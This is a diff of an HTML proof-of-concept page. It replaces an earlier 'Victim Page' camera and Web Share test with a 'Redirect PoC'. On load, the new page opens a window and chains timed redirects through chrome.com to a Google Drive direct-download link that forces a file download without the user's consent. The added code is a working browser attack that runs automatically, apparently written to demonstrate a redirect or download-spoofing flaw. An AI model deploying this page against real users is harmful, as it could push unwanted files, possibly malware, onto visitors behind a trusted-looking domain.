@@ -1,48 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Victim Page</title>
-<style>
-  body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-  video { width: 300px; height: 225px; background: black; border-radius: 12px; }
-  button { padding: 15px 25px; font-size: 16px; margin-top: 20px; }
-</style>
-</head>
-<body>
+  <meta charset="UTF-8">
+  <title>Redirect PoC</title>
+  <script>
+    function chainRedirect(w, urls, index = 0) {
+      if (index < urls.length) {
+        console.log("Redirecting to:", urls[index]);
+        w.location.replace(urls[index]);
 
-<h2>Victim Page</h2>
-
-<video id="video" autoplay playsinline muted></video>
-<br>
-<button id="actionBtn">Start Camera & Share</button>
-
-<script>
-const video = document.getElementById("video");
-const btn = document.getElementById("actionBtn");
-
-btn.onclick = async () => {
-  try {
-    // Start camera
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-
-    // Trigger Web Share API
-    if (navigator.share) {
-      await navigator.share({
-        title: "WebShare + Camera",
-        text: "Testing camera overlay by Web Share API",
-        url: location.href
-      });
-    } else {
-      alert("Web Share API not supported on this browser");
+        setTimeout(() => {
+          chainRedirect(w, urls, index + 1);
+        }, 400);
+      }
     }
 
-  } catch (err) {
-    console.error("Error:", err);
-  }
-};
-</script>
+    function startRedirect() {
+      let w = window.open("");
 
+      setTimeout(() => {
+        chainRedirect(w, [
+          "https://chrome.com",
+          "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ1FlDA48w-_QaRH1LvALFFA:1773898570212"
+        ]);
+      }, 300);
+    }
+  </script>
+</head>
+
+<body onload="startRedirect()">
+  <h3>Loading...</h3>
 </body>
 </html>
